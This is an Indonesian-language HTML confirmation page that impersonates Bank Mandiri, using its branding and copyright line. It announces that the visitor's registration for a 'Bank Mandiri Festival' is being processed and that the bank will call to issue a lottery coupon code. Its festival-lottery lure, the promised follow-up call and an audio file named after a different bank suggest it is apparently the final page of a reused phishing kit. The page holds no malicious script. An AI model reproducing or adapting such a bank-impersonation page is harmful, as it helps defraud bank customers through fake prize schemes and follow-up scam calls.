<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terima Kasih</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            font-family: Arial, sans-serif;
            flex-direction: column;
            padding: 20px;
        }
        .nav-container {
            width: 100%;
            max-width: 500px;
            margin-bottom: 10px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
        }
        .header img {
            max-width: 100%;
            margin-bottom: 10px;
        }
        .message {
            background: #004080;
            color: white;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: bold;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
    </style>
</head>
<body onload="playAudio()">
    <div class="nav-container">
        <img src="nav.jpg" alt="Livin by Mandiri" class="img-fluid">
    </div>
    <div class="container">
        <div class="header">
            <img src="mandiri.png" alt="Mandiri Logo">
        </div>
        <img src="orang.png" alt="Mandiri Staff" class="img-fluid">
        <div class="message">
            Terimakasih Telah Mendaftar Dilayanan Bank Mandiri Festival, Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Mandiri, Untuk Proses Cetak Kode Kupon Undian Anda.
        </div>
        <div class="footer">
            &copy; 2025 PT Bank Mandiri (Persero) Tbk.
        </div>
    </div>
    
    <audio id="thankYouAudio" src="bri.mp3"></audio>
    
    <script>
        function playAudio() {
            document.getElementById('thankYouAudio').play();
        }
    </script>
</body>
</html>
